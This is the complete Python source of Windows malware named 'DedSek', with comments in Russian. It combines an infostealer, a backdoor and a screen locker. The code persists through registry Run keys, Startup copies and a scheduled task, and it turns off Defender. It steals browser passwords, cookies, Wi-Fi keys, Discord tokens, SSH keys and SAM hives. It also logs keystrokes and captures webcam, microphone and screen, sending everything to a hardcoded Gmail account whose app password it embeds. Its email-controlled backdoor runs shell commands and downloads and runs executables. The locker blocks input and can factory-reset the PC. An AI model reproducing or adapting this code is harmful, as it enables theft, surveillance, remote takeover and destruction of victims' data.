import ctypes, os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import shutil, winshell, base64, random, socket, subprocess, json
import urllib.request, urllib.parse, smtplib, imaplib, email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab
import sqlite3, winreg, zipfile, win32crypt, re, glob as _glob, wave
from win32com.client import Dispatch

# ===== НАСТРОЙКИ =====
PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_SECONDS = 10
SKULL_BASE64 = "YOUR_BASE64_HERE"
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
CHECK_INTERVAL = 15

attempts_left = MAX_ATTEMPTS
keylog_data = []

# ===== СКРЫТИЕ =====
def hide_console():
    try:
        if sys.executable.endswith("python.exe"):
            pw = sys.executable.replace("python.exe", "pythonw.exe")
            if os.path.exists(pw):
                subprocess.Popen([pw, __file__] + sys.argv[1:], creationflags=0x08000000)
                os._exit(0)
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.FreeConsole()
    except: pass

# ===== WIN LOCK =====
def disable_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
    except: pass

def restore_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
    except: pass

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

# ===== EMAIL =====
def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = f'File: {desc}'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

# ===== АВТОЗАГРУЗКА 3 МОДУЛЕЙ =====
def add_all_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        
        _reg_add("DedSek_Stealer", pythonw, cp, "--stealer")
        _reg_add("DedSek_Backdoor", pythonw, cp, "--backdoor")
        _reg_add("DedSek_Locker", pythonw, cp, "--locker")
        
        for f in ["WindowsService_Stealer.pyw", "WindowsService_Backdoor.pyw", "WindowsService_Locker.pyw"]:
            dest = os.path.join(startup, f)
            if cp != dest:
                try: shutil.copy2(cp, dest)
                except: pass
        
        os.system(f'schtasks /delete /tn "DedSek_Locker_Task" /f >nul 2>&1')
        os.system(f'schtasks /create /tn "DedSek_Locker_Task" /tr "\\"{pythonw}\\" \\"{cp}\\" --locker" /sc ONLOGON /rl HIGHEST /f /it >nul 2>&1')
    except: pass

def _reg_add(name, pythonw, script, args):
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, f'"{pythonw}" "{script}" {args}')
        winreg.CloseKey(k)
    except: pass

# ===== DEFENDER =====
def bypass_defender():
    try:
        if is_admin():
            for p in [tempfile.gettempdir(), os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')]:
                os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'" >nul 2>&1')
            os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')
    except: pass

# ===== ЗАКРЫТИЕ ВСЕХ ПРИЛОЖЕНИЙ =====
def kill_all_apps():
    exclude = ['System','smss.exe','csrss.exe','wininit.exe','winlogon.exe','services.exe','lsass.exe','svchost.exe','dwm.exe','explorer.exe']
    try:
        result = subprocess.check_output('tasklist /FO CSV /NH', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        for line in result.split('\n'):
            if line.strip():
                parts = line.replace('"','').split(',')
                if len(parts) >= 1:
                    proc = parts[0].strip().lower()
                    if proc not in [e.lower() for e in exclude] and proc.endswith('.exe'):
                        os.system(f'taskkill /f /im {proc} >nul 2>&1')
    except: pass

# ===== РАСШИФРОВКА =====
def _decrypt_aes_gcm(data, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(data[:12], data[12:], None)
    except: return None

def _get_master_key(lp):
    ls = os.path.join(os.path.dirname(os.path.dirname(lp)), 'Local State')
    if os.path.exists(ls):
        try:
            kb = json.load(open(ls, 'r', encoding='utf-8'))['os_crypt']['encrypted_key']
            return win32crypt.CryptUnprotectData(base64.b64decode(kb)[5:], None, None, None, 0)[1]
        except: pass
    return None

def steal_chromium(browser, paths):
    res = []
    for lp in paths:
        if not os.path.exists(lp): continue
        try:
            mk = _get_master_key(lp)
            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(lp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    if pw[:3] == b'\x76\x31\x31' and mk:
                        pwd = _decrypt_aes_gcm(pw[3:], mk)
                        pwd = pwd.decode('utf-8','ignore') if pwd else "***"
                    else:
                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    res.append(f"{browser} | {url} | {user} | {pwd}")
                except: res.append(f"{browser} | {url} | {user} | ***")
            cur.close()
            try: os.remove(db)
            except: pass
        except: pass
    return res

def _parse_asn1(data):
    try:
        if data[0] != 0x30: return None, None
        off = 2 + (data[1] & 0x7F) if data[1] & 0x80 else 2
        iv = ct = None
        while off < len(data):
            tag, l = data[off], data[off+1]
            val = data[off+2:off+2+l]
            if tag == 0x04:
                if iv is None: iv = val
                else: ct = val
            off += 2 + l
        return iv, ct
    except: return None, None

def _decrypt_3des(data, key, iv):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
        r = dec.update(data) + dec.finalize()
        return r[:-r[-1]] if r[-1] < 16 else r
    except: return None

def steal_firefox():
    res = []
    base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(base): return res
    for folder in os.listdir(base):
        pf = os.path.join(base, folder)
        lf = os.path.join(pf, 'logins.json'); kf = os.path.join(pf, 'key4.db')
        if not os.path.exists(lf) or not os.path.exists(kf): continue
        try:
            logins = json.load(open(lf, 'r', encoding='utf-8'))
            cur = sqlite3.connect(kf).cursor()
            cur.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
            row = cur.fetchone()
            if not row or not row[1] or len(row[1]) < 24: continue
            key = row[1][:24]
            for login in logins.get('logins', []):
                host = login.get('hostname', ''); user = pwd = "ERROR"
                try:
                    iv, ct = _parse_asn1(base64.b64decode(login['encryptedUsername']))
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d: user = d.decode('utf-8','ignore').lstrip('\x00').strip()
                except: pass
                try:
                    iv, ct = _parse_asn1(base64.b64decode(login['encryptedPassword']))
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d: pwd = d.decode('utf-8','ignore').lstrip('\x00').strip()
                except: pass
                res.append(f"FIREFOX | {host} | {user} | {pwd}")
            cur.close()
        except:
            z = os.path.join(tempfile.gettempdir(), f'ff_{folder[:10]}.zip')
            with zipfile.ZipFile(z, 'w') as zf:
                for f in [lf, kf]:
                    if os.path.exists(f): zf.write(f, os.path.basename(f))
            send_file_email(z, f"Firefox {folder[:10]}")
            try: os.remove(z)
            except: pass
    return res

def steal_cookies():
    r = []
    for cp in [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')]:
        if not os.path.exists(cp): continue
        try:
            db = os.path.join(tempfile.gettempdir(), f'ck_{random.randint(0,9999)}.db')
            shutil.copy2(cp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, enc in cur.fetchall():
                try:
                    val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8','ignore')
                    r.append(f"CHROME | {host} | {name} | {val[:100]}")
                except: pass
            cur.close(); os.remove(db)
        except: pass
    return r[:300] if r else ["No cookies"]

def steal_wifi_passwords():
    r = []
    try:
        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    key = "НЕТ"
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
                    r.append(f"WiFi: {p} | Пароль: {key}")
    except: pass
    return r

def steal_discord():
    tokens = set()
    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'), 
               os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb')]:
        if not os.path.exists(db): continue
        for f in os.listdir(db):
            if f.endswith('.ldb') or f.endswith('.log'):
                try: tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
                except: pass
    return list(tokens)[:20]

def dump_sam():
    try:
        if not is_admin(): return "No admin"
        sp = os.path.join(tempfile.gettempdir(), 'sam'); syp = os.path.join(tempfile.gettempdir(), 'system')
        os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
        os.system(f'reg save HKLM\\SYSTEM "{syp}" /y >nul 2>&1')
        if os.path.exists(sp) and os.path.getsize(sp) > 100:
            z = os.path.join(tempfile.gettempdir(), 'sam.zip')
            with zipfile.ZipFile(z, 'w') as zf:
                zf.write(sp, 'sam'); zf.write(syp, 'system')
            send_file_email(z, "SAM+SYSTEM")
            try: os.remove(z); os.remove(sp); os.remove(syp)
            except: pass
            return "SAM dumped!"
        return "Failed"
    except: return "Error"

def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        if cam.isOpened():
            ret, frame = cam.read()
            if ret:
                fp = os.path.join(tempfile.gettempdir(), f'cam_{int(time.time())}.jpg')
                cv2.imwrite(fp, frame)
                send_file_email(fp, "Webcam")
                try: os.remove(fp)
                except: pass
        cam.release()
    except: pass

def record_mic():
    try:
        import pyaudio
        CHUNK, FORMAT, CHANNELS, RATE, SEC = 1024, pyaudio.paInt16, 1, 44100, 30
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE/CHUNK*SEC)):
            try: frames.append(stream.read(CHUNK, exception_on_overflow=False))
            except: break
        stream.stop_stream(); stream.close(); p.terminate()
        fp = os.path.join(tempfile.gettempdir(), f'mic_{int(time.time())}.wav')
        wf = wave.open(fp, 'wb')
        wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT)); wf.setframerate(RATE)
        wf.writeframes(b''.join(frames)); wf.close()
        send_file_email(fp, "Mic")
        try: os.remove(fp)
        except: pass
    except: pass

def keylogger_thread():
    try:
        import keyboard
        def on_key(e):
            global keylog_data
            keylog_data.append(f"{time.strftime('%H:%M:%S')} | {e.name}")
            if len(keylog_data) >= 100:
                send_email('\n'.join(keylog_data), "Keylogger")
                keylog_data.clear()
        keyboard.on_press(on_key)
    except: pass

def scan_configs():
    configs = {
        "SSH": os.path.join(os.environ['USERPROFILE'], '.ssh', 'id_rsa'),
        "RDP": os.path.join(os.environ['USERPROFILE'], 'Documents', 'Default.rdp'),
    }
    for name, path in configs.items():
        if os.path.exists(path) and os.path.getsize(path) < 5*1024*1024:
            send_file_email(path, f"Config: {name}")

def scan_router():
    for ip, creds in [("192.168.1.1", [("admin","admin"),("admin","1234")]), ("192.168.0.1", [("admin","admin")])]:
        for u, p in creds:
            try:
                req = urllib.request.Request(f"http://{ip}/", headers={'Authorization': 'Basic ' + base64.b64encode(f"{u}:{p}".encode()).decode()})
                if urllib.request.urlopen(req, timeout=3).getcode() == 200:
                    send_email(f"ROUTER {ip} | {u}:{p}", "Router Password")
                    return
            except: pass

# ===== МЕГА-СТИЛЕР =====
def mega_steal_auto():
    try:
        R = ["="*60, "DEDSEK AUTO-STEAL REPORT", "="*60]
        R += [f"\nUSER: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]
        
        try: R.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
        except: pass
        try:
            ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
            g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
            R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')} | {g.get('isp','?')}")
        except: pass
        
        try: R.append("\nIPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:5000])
        except: pass
        
        R.append("\n=== WIFI ===")
        R.extend(steal_wifi_passwords() or ["No WiFi"])
        
        R.append("\n=== BROWSERS ===")
        for name, paths in {
            "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
            "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
            "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
            "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')],
        }.items():
            data = steal_chromium(name, paths)
            R.append(f"\n--- {name} ---")
            R.extend(data if data else ["No data"])
        
        R.append("\n--- FIREFOX ---")
        R.extend(steal_firefox() or ["No data"])
        
        R.append("\n=== COOKIES ===")
        R.extend(steal_cookies())
        
        R.append("\n=== DISCORD ===")
        tokens = steal_discord()
        R.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
        
        R.append("\n=== SAM ===")
        R.append(dump_sam())
        
        threading.Thread(target=scan_configs, daemon=True).start()
        threading.Thread(target=scan_router, daemon=True).start()
        threading.Thread(target=capture_webcam, daemon=True).start()
        threading.Thread(target=record_mic, daemon=True).start()
        
        try:
            ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
            ImageGrab.grab().save(ss, 'JPEG', quality=50)
            send_file_email(ss, "Desktop Screenshot")
            try: os.remove(ss)
            except: pass
        except: pass
        
        R += ["\n" + "="*60, f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}", "="*60]
        
        text = '\n'.join(R)
        for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
            send_email(part, f"DedSek Report [{i+1}]")
    except Exception as e:
        send_email(f"Stealer error: {e}")

# ===== БЕКДОР =====
def mail_controller():
    while True:
        try:
            mail = imaplib.IMAP4_SSL('imap.gmail.com')
            mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); mail.select('inbox')
            _, data = mail.search(None, 'SUBJECT "DEDSEK"', 'UNSEEN')
            if data[0]:
                for n in data[0].split():
                    _, md = mail.fetch(n, '(RFC822)')
                    msg = email.message_from_bytes(md[0][1])
                    if msg.is_multipart():
                        for p in msg.walk():
                            if p.get_content_type() == "text/plain":
                                cmd = p.get_payload(decode=True).decode().strip()
                                resp = _process_cmd(cmd)
                                if resp: send_email(resp, "DEDSEK RESPONSE")
                    mail.store(n, '+FLAGS', '\\Seen')
            mail.close(); mail.logout()
        except: pass
        time.sleep(CHECK_INTERVAL)

def _process_cmd(cmd):
    try:
        parts = cmd.split(':', 1)
        action = parts[0].upper().strip()
        arg = parts[1].strip() if len(parts) > 1 else ""
        
        if action == "INFO":
            return f"USER: {os.environ.get('USERNAME')}\nPC: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\nADMIN: {is_admin()}"
        elif action == "CMD":
            try:
                r = subprocess.check_output(arg, shell=True, stderr=subprocess.STDOUT, timeout=60)
                return r.decode('cp866', errors='replace')[:5000]
            except subprocess.CalledProcessError as e:
                return e.output.decode('cp866', errors='replace')[:5000]
        elif action == "STEAL":
            threading.Thread(target=mega_steal_auto, daemon=True).start()
            return "Stealer started"
        elif action == "SCREENSHOT":
            fp = os.path.join(tempfile.gettempdir(), f'ss_{int(time.time())}.jpg')
            ImageGrab.grab().save(fp, 'JPEG', quality=50)
            send_file_email(fp, "Screenshot")
            try: os.remove(fp)
            except: pass
            return "Screenshot sent!"
        elif action == "WEBCAM":
            capture_webcam()
            return "Webcam sent"
        elif action == "MIC":
            threading.Thread(target=record_mic, daemon=True).start()
            return "Recording 30s"
        elif action == "DOWNLOAD":
            url = arg.strip()
            fp = os.path.join(tempfile.gettempdir(), f'dl_{int(time.time())}.exe')
            urllib.request.urlretrieve(url, fp)
            subprocess.Popen(fp, shell=True)
            return f"OK: {url}"
        elif action == "LOCK":
            ctypes.windll.user32.LockWorkStation()
            return "Locked"
        elif action == "BSOD":
            threading.Thread(target=lambda: (time.sleep(2), ctypes.windll.ntdll.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_bool())), ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD,0,0,0,6,ctypes.byref(ctypes.c_uint()))), daemon=True).start()
            return "BSOD"
        elif action == "SHUTDOWN":
            os.system("shutdown /s /t 10 /f")
            return "Shutdown"
        elif action == "HELP":
            return "INFO|CMD:|STEAL|SCREENSHOT|WEBCAM|MIC|DOWNLOAD:|LOCK|BSOD|SHUTDOWN|KEYLOG|COOKIES|WIFI|SAM|DISCORD"
        else:
            return f"Unknown: {action}"
    except Exception as e:
        return f"Error: {e}"

# ===== ЗАПИСЬ ЭКРАНА =====
def record_loop():
    while True:
        try:
            vp = os.path.join(tempfile.gettempdir(), f"v_{int(time.time())}.avi")
            out = cv2.VideoWriter(vp, cv2.VideoWriter_fourcc(*'XVID'), 10.0, (1280, 720))
            for _ in range(150):
                out.write(cv2.resize(cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_BGR2RGB), (1280, 720)))
                time.sleep(0.1)
            out.release()
            if os.path.getsize(vp) > 20*1024*1024:
                try:
                    out2 = vp.replace('.avi', '.mp4')
                    subprocess.run(['ffmpeg', '-i', vp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out2], capture_output=True, timeout=30)
                    vp = out2
                except: pass
            send_file_email(vp, "Video")
            try: os.remove(vp)
            except: pass
        except: time.sleep(1)

# ===== ВИНЛОКЕР =====
def block_keys():
    try:
        import keyboard
        combos = ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']
        for c in combos:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
        keys = list('abcdefghijklmnopqrstuvwxyz0123456789') + ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','space','enter','backspace','tab','caps lock','shift','ctrl','alt','esc','delete','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','print screen','scroll lock','pause']
        for k in keys:
            try: keyboard.block_key(k)
            except: pass
    except:
        try: ctypes.windll.user32.BlockInput(True)
        except: pass

def unblock():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try:
        import keyboard; keyboard.unhook_all()
    except: pass

def kill_procs():
    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe"]
    while True:
        for p in kl: os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def boot_anim():
    a = tk.Tk()
    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    disable_win_key()
    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier',20,'bold')); l.pack(expand=True)
    for i in range(8):
        a.configure(bg='white' if i%2==0 else 'black'); l.config(bg='white' if i%2==0 else 'black', fg='black' if i%2==0 else 'white')
        a.update(); time.sleep(0.2)
    a.configure(bg='black'); l.config(bg='black', fg='#00FF00'); a.attributes('-alpha', 0)
    for alpha in range(0, 110, 5):
        a.attributes('-alpha', alpha/100); l.config(text="DedSek тебя взломал"); a.update(); time.sleep(0.03)
    time.sleep(1.5)
    for msg in ["Идёт шифровка...","[                    ] 0%","[####                ] 20%","[########            ] 40%","[############        ] 60%","[################    ] 80%","[####################] 100%","","ДАННЫЕ ЗАШИФРОВАНЫ!"]:
        l.config(text=msg); a.update(); time.sleep(0.25)
    time.sleep(1); a.destroy()

def reset_windows():
    try:
        restore_win_key(); unblock()
        es = tk.Tk()
        es.attributes('-fullscreen', True); es.attributes('-topmost', True)
        es.configure(bg='black'); es.overrideredirect(True)
        tk.Label(es, text="404 | ОШИБКА", bg='black', fg='#FF0000', font=('Courier',40,'bold')).pack(expand=True)
        tk.Label(es, text="ВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier',20)).pack()
        es.update(); time.sleep(5); es.destroy()
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("systemreset -factoryreset"); time.sleep(3)
        os.system("shutdown /r /t 0 /f"); os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f"); os._exit(0)

class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f: f.write(img_data)
            img = PhotoImage(file=img_path)
            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.1, anchor='center')
            self.win._img = img
        except: pass
        
        msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ПАРОЛЬ — ЭТО ОТВЕТ НА ЗАГАДКУ:

Я — год, когда произошло событие,
которое не произошло.

В Англии заговорщики планировали
взорвать парламент и убить короля.
Их план провалился, король выжил,
а заговорщиков казнили.

Но в Windows я стал началом времён.
Потому что я — первый год,
который существует в этом мире,
но не существовал в реальности.

ЧТО Я ЗА ЧИСЛО?

ПОДСКАЗКА: Это связано с Windows,
а не с реальной историей.

У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ.
НЕ УГАДАЕШЬ — ДАННЫЕ УДАЛЕНЫ НАВСЕГДА."""
        
        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier',10,'bold'), justify='left').place(relx=0.5, rely=0.48, anchor='center')
        
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.85, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier',14,'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='black', fg='#00FF00', insertbackground='#00FF00', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='#FF0000', font=('Courier',12,'bold'))
        self.status_lbl.pack()
        self.pw.bind('<Return>', self.check)
        self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try:
            self.win.focus_force()
            self.pw.focus_force()
            self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            restore_win_key(); unblock()
            self.status_lbl.config(text="ВЕРНО!", fg='#00FF00'); self.win.update(); time.sleep(1)
            self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.status_lbl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='#FF0000')
            else:
                self.status_lbl.config(text="404 | ОШИБКА", fg='#FF0000'); self.win.update(); time.sleep(2)
                self.root.destroy(); reset_windows()
            self.pw.delete(0, tk.END)

# ===== MAIN =====
if __name__ == "__main__":
    hide_console()
    disable_win_key()
    bypass_defender()
    
    if "--stealer" in sys.argv:
        mega_steal_auto()
        sys.exit(0)
    
    if "--backdoor" in sys.argv:
        mail_controller()
        sys.exit(0)
    
    if "--locker" in sys.argv:
        kill_all_apps()
        time.sleep(2)
        time.sleep(TIMER_SECONDS)
        boot_anim()
        block_keys()
        try: ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Service...")
        except: pass
        threading.Thread(target=kill_procs, daemon=True).start()
        WinLocker()
        tk.mainloop()
        sys.exit(0)
    
    add_all_to_startup()
    threading.Thread(target=mega_steal_auto, daemon=True).start()
    threading.Thread(target=record_loop, daemon=True).start()
    threading.Thread(target=mail_controller, daemon=True).start()
    threading.Thread(target=keylogger_thread, daemon=True).start()
    
    kill_all_apps()
    time.sleep(2)
    time.sleep(TIMER_SECONDS)
    boot_anim()
    block_keys()
    try: ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Service...")
    except: pass
    threading.Thread(target=kill_procs, daemon=True).start()
    WinLocker()
    tk.mainloop()
